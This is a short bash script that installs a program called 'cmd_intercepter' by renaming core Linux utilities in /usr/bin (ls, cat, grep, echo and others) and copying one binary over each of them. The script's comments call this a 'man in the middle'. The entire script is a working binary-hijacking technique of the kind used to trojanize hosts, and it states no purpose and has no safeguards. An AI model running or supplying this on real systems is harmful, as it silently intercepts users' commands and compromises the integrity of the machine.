#!/bin/bash

APP="cmd_intercepter"
PLATTFORM="linux"
ARCHITECTURE="amd64"

# add programms to move
mv "/usr/bin/ls" "/usr/bin/ls2"
mv "/usr/bin/echo" "/usr/bin/echo2"
mv "/usr/bin/cat" "/usr/bin/cat2"
mv "/usr/bin/tac" "/usr/bin/tac2"
mv "/usr/bin/grep" "/usr/bin/grep2"
mv "/usr/bin/tail" "/usr/bin/tail2"
mv "/usr/bin/head" "/usr/bin/head2"

# add man in the middle
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/ls"
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/echo"
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/cat"
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/tac"
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/grep"
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/tail"
cp $APP-$PLATTFORM-$ARCHITECTURE "/usr/bin/head"
